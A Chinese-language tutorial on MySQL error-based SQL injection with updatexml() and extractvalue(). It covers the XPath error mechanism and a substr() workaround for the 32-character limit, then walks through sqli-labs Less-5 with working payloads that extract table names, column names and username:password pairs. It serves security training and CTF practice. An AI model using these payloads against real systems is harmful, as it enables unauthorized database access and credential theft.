---
date: 2026-10-15
title: "UpdateXML与ExtractValue报错注入剖析"
---
# ⚡ UpdateXML 与 ExtractValue 报错注入底层深度剖析

> **适用场景**：当目标页面**关闭了正常结果回显**（没有回显位，无法使用 `UNION SELECT`），但开启了数据库错误信息回显（代码中包含 `echo mysqli_error()`）时，报错注入是最高效的利用手段。

---



> [!NOTE] 模块前置语言与工具清单
> - **前置通关必备**：零基础读者强烈建议先通读全局导航 **[[01-零基础入门前置指南与黑话工具字典]]**，掌握安全法律红线、终端命令行、HTTP 报文骨架与黑话字典！
> - **环境依赖**：具备基础 Web 浏览器（Chrome/Firefox）抓包认知或轻量 Python 脚本执行能力。

## 一、底层机制：为什么 XML 处理函数能引发数据泄露？

MySQL 5.1.5 及以上版本引入了针对 XML 文档解析的原生函数。其中 `updatexml()` 和 `extractvalue()` 支持使用 **XPath 表达式** 定位 XML 节点。

### 1. XPath 语法的严格性
根据 W3C XPath 标准规范，合法的 XPath 表达式必须以根路径 `/`、相对路径或合法的 XML 标签名（NCName）开头。
当传入的 XPath 字符串包含非法特殊字符（如波浪号 `~`、冒号 `:`、感叹号 `!` 等）时，MySQL 的底层 XML 解析引擎（`item_xmlfunc.cc`）会判定其语法非法并抛出致命错误：
```text
ERROR 1105 (HY000): XPATH syntax error: '~【恶意数据被拼接在错误文本中返回】'
```
> [!IMPORTANT]
> **漏洞核心与通俗生活比喻（故意激怒考官念出答案）**：
> * **正常回显被关闭时的困境**：
>   就像你礼貌地向考官询问：“请告诉我数据库里的密码是什么？”，考官冷冰冰地回答：“抱歉，本系统不对外显示任何查询结果，只提示 `You are in...`（登录成功）”。
> * **报错注入的破局策略**：
>   你故意向数据库提交一份**语法极其荒谬的请求**，要求它把“真正的密码数据”与“非法违禁符号（`~`）”强行绑在一起送进一个严格的 XML 检查器里。
> * **数据库中计**：
>   XML 检查器发现数据格式完全错乱，大为光火，立即通过报错日志向屏幕大声咆哮斥责：
>   `“发生语法错误！你提交的【~真正的密码~】根本不是一个合法的路径！”`
>   **数据库在斥责我们语法错误的同时，不知不觉把原本保密的敏感数据当成错误内容，原封不动地全盘念了出来！**

---

## 二、两个核心函数的语法与参数逐个拆解

### 1. UpdateXML() 函数

* **官方定义**：`UPDATEXML(xml_target, xpath_expr, new_xml)`
* **本意作用**：将目标 XML 标记片段中匹配 `xpath_expr` 的节点，替换为 `new_xml`。

#### 🔍 注入 Payload 结构与参数逐个拆解：
```sql
AND updatexml(1, concat(0x7e, (SELECT user()), 0x7e), 1) --+
```

| 参数序号 / 表达式 | 传入内容 | 底层行为与设计考量 | 为什么这样写？ |
| :--- | :--- | :--- | :--- |
| **参数 1** (`xml_target`) | `1` | 目标 XML 片段。 | 填充任意有效占位常量即可（这里写 `1`），因为代码在解析到第 2 个参数时就会直接崩溃抛错，根本不会走到实际的 XML 替换流程。 |
| **参数 2** (`xpath_expr`) | `concat(0x7e, (SELECT user()), 0x7e)` | **攻击核心向量**。这是待解析的 XPath 路径。 | **关键解析**：<br>1. 子查询 `(SELECT user())` 会优先执行，获取到当前用户字符串（如 `root@localhost`）；<br>2. `concat()` 将前后两个 `0x7e` 与数据拼接在一起；<br>3. `0x7e` 是波浪号 `~` 的十六进制 ASCII 码。XPath 解析器读取首字符为 `~` 时，立即认定非法，直接触发 `XPATH syntax error` 并将整段拼接结果打印在报错中！ |
| **参数 3** (`new_xml`) | `1` | 替换后的新 XML 内容。 | 同样只需填入占位数字 `1` 即可。 |

---

### 2. ExtractValue() 函数

* **官方定义**：`EXTRACTVALUE(xml_target, xpath_expr)`
* **本意作用**：从目标 XML 片段中按 `xpath_expr` 抽取对应的值。

#### 🔍 注入 Payload 结构与参数逐个拆解：
```sql
AND extractvalue(1, concat(0x7e, (SELECT database()))) --+
```

| 参数序号 / 表达式 | 传入内容 | 底层行为与设计考量 |
| :--- | :--- | :--- |
| **参数 1** (`xml_target`) | `1` | 占位参数，无实际执行意义。 |
| **参数 2** (`xpath_expr`) | `concat(0x7e, (SELECT database()))` | 构造非法的 XPath 字符串，强制触发报错回显。只需 2 个参数，Payload 比 `updatexml` 更短（节省字符限制）。 |

---

## 三、32 字符截断陷阱与突破技术

### 1. 为什么最多只能看到 32 个字符？
在 MySQL 源码中，针对 XPath 错误提示信息的缓冲区存在硬性截断长度限制（最多打印 **32 个字符**）。
因为我们开头使用了一个 `0x7e`（`~`）作为非法触发符，所以实际能够有效泄露的数据**只有 31 个字符**！
如果我们要读取长 Hash（如 32 位 MD5）、长 JWT Token 或 CTF 中的超长 Flag，直接查询会被无情截断丢失后半截。

### 2. 突破方案：分段截取法（`substr()` / `substring()` / `mid()`）

通过在子查询外层嵌套字符串截取函数，分批滑动窗口提取：

#### 🔍 分段提取 Flag 的连续 Payload 剖析：

* **第 1 次提取（前 30 位）**：
```sql
AND updatexml(1, concat(0x7e, substr((SELECT flag FROM ctf_flag), 1, 30)), 1) --+
```
> **回显示例**：`XPATH syntax error: '~flag{0123456789abcdef012345678'`

* **第 2 次提取（第 31 位起的后续字符）**：
```sql
AND updatexml(1, concat(0x7e, substr((SELECT flag FROM ctf_flag), 31, 30)), 1) --+
```
> **回显示例**：`XPATH syntax error: '~9abcdef_flag_completed}'`

#### 🔍 `substr(str, start, length)` 参数细节：
* `start = 1`：SQL 语言中字符串索引从 **1** 开始（不是从 0 开始）；
* `length = 30`：每次稳定提取 30 个字符，留出 1 个字符给首部的 `~`，避免被截断干扰。两次结果人工或脚本拼接即可得到完整 Flag。

---

## 四、经典实战演练：Sqli-Labs Less-5 报错全流程复现

### 1. 靶场背景
在 `sqli-labs` Less-5 中，无论输入什么合法的 ID，页面只返回 `You are in...........`，没有任何数据回显；但若传入单引号 `?id=1'`，页面会打印出 `mysqli_error()` 的数据库错误详情。此时必须使用报错注入！

### 2. 全流程脱库实战步骤

#### 步骤 1：闭合确认与注入测试
```text
GET /Less-5/?id=1' AND updatexml(1, concat(0x7e, 123456), 1) --+
```
* **页面报错**：`XPATH syntax error: '~123456'`
* **分析**：成功触发报错，进入利用流程。

#### 步骤 2：爆当前数据库名
```text
GET /Less-5/?id=1' AND updatexml(1, concat(0x7e, database()), 1) --+
```
* **页面报错**：`XPATH syntax error: '~security'`
* **获取数据**：当前数据库名为 `security`。

#### 步骤 3：爆表名（结合 limit 逐行提取）
> [!TIP]
> 报错注入中的子查询必须保证只返回**单行单列**，否则会报错 `Subquery returns more than 1 row`！
> 因此不能直接查多行，必须使用 `LIMIT 0,1`、`LIMIT 1,1` 逐行读取。

```text
GET /Less-5/?id=1' AND updatexml(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 3,1)), 1) --+
```
* **页面报错**：`XPATH syntax error: '~users'`
* **获取数据**：第四张表为目标表 `users`。

#### 步骤 4：爆列名
```text
GET /Less-5/?id=1' AND updatexml(1, concat(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name=0x7573657273 LIMIT 2,1)), 1) --+
```
* **页面报错**：`XPATH syntax error: '~password'`
* **获取数据**：存在 `password` 字段。

#### 步骤 5：爆最终账号密码（分段读取）
```text
GET /Less-5/?id=1' AND updatexml(1, concat(0x7e, (SELECT concat(username, 0x3a, password) FROM users LIMIT 0,1)), 1) --+
```
* **页面报错**：`XPATH syntax error: '~Dumb:Dumb'`

---

## 🔗 相关双向链接
- 上级模块：[[02-SQL注入体系]]
- 前置基础：[[SQL注入分类与闭合判断深度精解]]
- 下级高阶：[[Floor报错注入底层双查询冲突机制]]
- 知识地图：[[00-Web安全与CTF知识地图总览]]
